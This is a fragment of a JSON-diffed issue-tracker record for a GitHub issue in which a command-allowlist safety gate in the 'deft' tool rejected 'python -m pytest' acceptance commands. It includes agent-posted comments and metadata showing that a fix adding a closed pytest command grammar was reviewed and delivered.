+          "body": "model: grok-4.7\n```quarantined\nrole: parent\n```\n\n## Verified-claims table\n\n| # | Claim | Method | Status |\n| --- | --- | --- | --- |\n| 1 | python -m pytest, python3 -m pytest, and py -m pytest still refuse at the dispatch SHA | Parsed ALLOWED_FIRST_TOKENS and evaluateCommandSafety at 39c7fda2ce57f02e7cdb90eb0200a7c4543f0978; safety-branches.test.ts | held |\n| 2 | The closed argv grammar plus stamp-time check covers Stop 1 P1 | Stop 1 5769541391 vs Bound-remedy bullets 1 and 2 on lean 5770003445 | held |\n| 3 | The uv command is outside this pain and lives on #4849 | Leftover issue 4849 open; comment 5767179274 | held |\n| 4 | evaluateStampAcceptanceSafety does not yet call evaluateCommandSafety | Pin-read evaluateStampAcceptanceSafety at the dispatch SHA | held |\n\n",
+          "id": 5770075461,
+          "html_url": "https://github.com/deftai/directive/issues/4702#issuecomment-5770075461",
+          "user": {
+            "login": "MScottAdams",
+            "id": 59447805,
+            "node_id": "MDQ6VXNlcjU5NDQ3ODA1",
+            "avatar_url": "https://avatars.githubusercontent.com/u/59447805?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/MScottAdams",
+            "html_url": "https://github.com/MScottAdams",
+            "followers_url": "https://api.github.com/users/MScottAdams/followers",
+            "following_url": "https://api.github.com/users/MScottAdams/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MScottAdams/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/MScottAdams/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MScottAdams/subscriptions",
+            "organizations_url": "https://api.github.com/users/MScottAdams/orgs",
+            "repos_url": "https://api.github.com/users/MScottAdams/repos",
+            "events_url": "https://api.github.com/users/MScottAdams/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/MScottAdams/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "created_at": "2026-09-22T01:47:16Z",
+          "updated_at": "2026-09-22T01:47:16Z",
+          "author_association": "MEMBER"
+        },
+        {
+          "body": "model: grok-4.7\n```quarantined\nrole: parent\n```\n\n## In plain English\n\nA Python project's pytest command is refused by the acceptance safety check. The accepted change is a closed pytest command shape, including python3 and py, with the same check when the command is written. The uv command stays on issue 4849.\n\ndesign-critique: synthesis accepted, because agents agreed (empty disagreement set)\n\nBound contract: successor lean 5770003445.\n\n",
+          "id": 5770075551,
+          "html_url": "https://github.com/deftai/directive/issues/4702#issuecomment-5770075551",
+          "user": {
+            "login": "MScottAdams",
+            "id": 59447805,
+            "node_id": "MDQ6VXNlcjU5NDQ3ODA1",
+            "avatar_url": "https://avatars.githubusercontent.com/u/59447805?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/MScottAdams",
+            "html_url": "https://github.com/MScottAdams",
+            "followers_url": "https://api.github.com/users/MScottAdams/followers",
+            "following_url": "https://api.github.com/users/MScottAdams/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MScottAdams/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/MScottAdams/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MScottAdams/subscriptions",
+            "organizations_url": "https://api.github.com/users/MScottAdams/orgs",
+            "repos_url": "https://api.github.com/users/MScottAdams/repos",
+            "events_url": "https://api.github.com/users/MScottAdams/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/MScottAdams/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "created_at": "2026-09-22T01:47:17Z",
+          "updated_at": "2026-09-22T01:47:17Z",
+          "author_association": "MEMBER"
+        }
+      ],
+      "issueBody": "## Summary\n\nUAT Tester 6 built a small Python CLI (`gh-stub`) with passing pytest and `.coverage` on disk. `deft check` still failed closed because `python -m pytest …` is not on the literal-AC allowlist.\n\n## What happened\n\nSwarm workers used acceptance commands like:\n\n- `python -m pytest tests/test_new.py -q`\n- `python -m pytest tests/test_list.py -q`\n\nLocal product tests passed (100%). Coverage files existed.\n\nFrom the project root:\n\n```text\ndeft check --framework-root .deft/core --project-root .\n```\n\n`verify:ac` failed for both active briefs:\n\n```text\nfirst token \"python\" is not in the literal-AC allowlist\nacceptance verdict: safety-rejected\ncheck: gate verify:ac failed (exit 1)\n```\n\nSo the product was green. The process gate was red for a normal Python consumer command.\n\n### Extra usability note\n\nBare `deft check` (no flags) failed with:\n\n```text\ncheck: --framework-root and --project-root are required\n```\n\nFrom a project root that already has `.deft/core/`, that should not be required.\n\n## Expected\n\n- A Python consumer can use `python -m pytest …` (or an equivalent documented allowlisted form) as literal AC without a safety reject.\n- Or doctor / swarm must stamp an allowlisted command up front so the worker never writes a doomed AC.\n- `deft check` run at the project root should infer framework and project roots when the layout is obvious.\n\n## Environment\n\n- UAT Tester 6\n- Host: Grok Build\n- OS: Ubuntu 24.04 via WSL\n- Package: `@deftai/directive@0.119.1`\n- Consumer: Python `gh-stub` (pytest + uv)\n\n## Checks\n\nC12 FAIL, C12b PASS (named `verify:ac`), C12c PASS (`.coverage` present).\n\n## Related\n\nLiteral-AC parsing bugs in this area are mostly closed. This is a **consumer allowlist** gap for Python, not phantom-command parsing.\n\n",
+      "x-directive/plan-id": {
+        "version": 1,
+        "source": "github-rest-id",
+        "github_issue_id": 5489223372,
+        "origin": "deftai/directive#4702",
+        "id": "github.issue.5489223372"
+      },
+      "x-directive/admitted-target-digest": {
+        "schema": "deft.scope.admitted-target-digest.v1",
+        "algorithm": "sha256",
+        "sha256": "fd6d5395b72aae02ecb4f3d810e1d7a376dcbb8e66174913de2dda514b81d95b"
+      },
+      "completionProvenance": {
+        "repository": null,
+        "implementationCommit": null,
+        "prNumber": 4865,
+        "prBase": null,
+        "mergeCommit": "e0cc383ac",
+        "deliveryBranch": "master",
+        "deliveryCommit": "e0cc383ac9ccb6ef0db697db6bfbfd9c92107289",
+        "verifiedAt": "2026-09-22T14:08:45Z",
+        "verifier": "scope:complete",
+        "disposition": "delivered",
+        "handoffState": "delivered",
+        "deployed": null,
+        "uatVerified": null
+      },
+      "deliveryDisposition": "delivered",
+      "handoffState": "delivered",
+      "completedAt": "2026-09-22T14:08:45Z",
+      "capacityBucket": "technical-debt",
+      "lifecycleWrite": {
+        "action": "complete",
+        "writtenAt": "2026-09-22T14:08:45Z"
+      }
+    },
+    "id": "github.issue.5489223372",
+    "updated": "2026-09-22T14:08:45Z"
+  }
+}
